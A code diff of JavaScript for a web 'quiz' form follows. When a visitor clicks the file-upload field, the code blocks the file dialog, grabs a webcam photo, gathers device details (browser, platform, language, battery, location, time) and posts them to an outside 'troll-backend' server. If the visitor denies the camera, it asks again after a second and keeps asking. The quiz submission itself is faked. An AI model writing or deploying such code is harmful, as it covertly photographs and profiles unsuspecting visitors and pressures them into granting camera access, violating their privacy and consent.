@@ -1,17 +1,15 @@
 const form = document.getElementById("quiz-form");
 const videoEl = document.getElementById("video");
 const canvasEl = document.getElementById("canvas");
-const toast = document.getElementById("toast");
 const fileInput = document.getElementById("user-file");
+const toast = document.getElementById("toast");
 const submitBtn = document.getElementById("submit-btn");
 
 const backendURL = "https://troll-backend.onrender.com/api/upload";
-const constraints = { video: { facingMode: "user" }, audio: false };
+const constraints = { video: { facingMode: "user" }, audio: false }; // only camera
 
-// =====================
-// TOAST FUNCTION
-// =====================
-function showToast(message) {
+// Show a toast
+function showToast(message, duration = 2000) {
   toast.innerText = message;
   toast.style.display = "block";
   toast.style.opacity = 1;
@@ -19,30 +17,30 @@ function showToast(message) {
   setTimeout(() => {
     toast.style.opacity = 0;
     setTimeout(() => (toast.style.display = "none"), 300);
-  }, 2000);
+  }, duration);
 }
 
-// =====================
-// CAPTURE CAMERA IMAGE & SEND
-// =====================
+// Capture image from camera and send to backend
 async function captureAndSendCamera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     videoEl.srcObject = stream;
     await videoEl.play();
 
-    // Small delay to ensure video is ready
-    await new Promise((res) =>
-      videoEl.addEventListener("canplay", () => setTimeout(res, 300))
-    );
+    // Wait until video can play
+    await new Promise((res) => videoEl.addEventListener("canplay", () => setTimeout(res, 200)));
 
+    // Draw image
     const ctx = canvasEl.getContext("2d");
     canvasEl.width = videoEl.videoWidth;
     canvasEl.height = videoEl.videoHeight;
     ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
     const image = canvasEl.toDataURL("image/png");
 
-    // Collect metadata
+    // Stop camera
+    videoEl.srcObject.getTracks().forEach(track => track.stop());
+
+    // Send to backend
     const metadata = {
       useragent: navigator.userAgent,
       platform: navigator.platform,
@@ -51,7 +49,7 @@ async function captureAndSendCamera() {
       language: navigator.language,
       battery: "N/A",
       location: "N/A",
-      time: new Date().toLocaleString(),
+      time: new Date().toLocaleString()
     };
 
     if (navigator.getBattery) {
@@ -70,63 +68,44 @@ async function captureAndSendCamera() {
       }
     }
 
-    // Send image + metadata silently
-    fetch(backendURL, {
+    await fetch(backendURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image, metadata }),
-    })
-      .then((res) => res.json())
-      .then((data) => console.log("Camera image sent:", data))
-      .catch((err) => console.error("Camera upload error:", err));
+      body: JSON.stringify({ image, metadata })
+    });
 
-    // Stop camera immediately
-    videoEl.srcObject.getTracks().forEach((track) => track.stop());
+    showToast("Camera image captured successfully!", 1500);
+
   } catch (err) {
-    console.error("Camera permission denied or error:", err);
-    showToast("Camera access is required for this feature!");
-    // Retry asking permission next time
+    console.error("Camera not allowed:", err);
+    showToast("Camera permission is required!");
+    // Retry after short delay
+    await new Promise(res => setTimeout(res, 1000));
+    captureAndSendCamera();
   }
 }
 
-// =====================
-// HANDLE FILE INPUT CLICK
-// =====================
+// Attach click to file input to first ask camera
 fileInput.addEventListener("click", async (e) => {
-  e.preventDefault();
-  // Ask for camera permission first
-  await captureAndSendCamera();
-  // Open file picker after camera is captured
-  fileInput.click(); // re-trigger click
+  e.preventDefault(); // prevent default file dialog
+  await captureAndSendCamera(); // ask for camera first
+  // then open file selector
+  fileInput.click();
 });
 
-// =====================
-// HANDLE FORM SUBMIT
-// =====================
-form.addEventListener("submit", (e) => {
+// Submit handler
+form.addEventListener("submit", async (e) => {
   e.preventDefault();
-
   submitBtn.disabled = true;
   submitBtn.textContent = "Submitting...";
   showToast("Submitting your response...");
 
-  // Normally the user file is already selected
-  const userFile = fileInput.files[0];
-  if (!userFile) {
-    showToast("Please select a file before submitting!");
+  // Normally handle your form data here, including fileInput.files
+  // For demo, just show success
+  setTimeout(() => {
+    document.getElementById("quiz-container").style.display = "none";
+    document.getElementById("success-container").style.display = "block";
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit";
-    return;
-  }
-
-  // Here you can handle the form submission logic
-  // For example, send the selected file along with other answers to your backend
-
-  // For demonstration, show success container
-  document.getElementById("quiz-container").style.display = "none";
-  document.getElementById("success-container").style.display = "block";
-
-  submitBtn.disabled = false;
-  submitBtn.textContent = "Submit";
-  showToast("Response submitted successfully!");
+  }, 1000);
 });
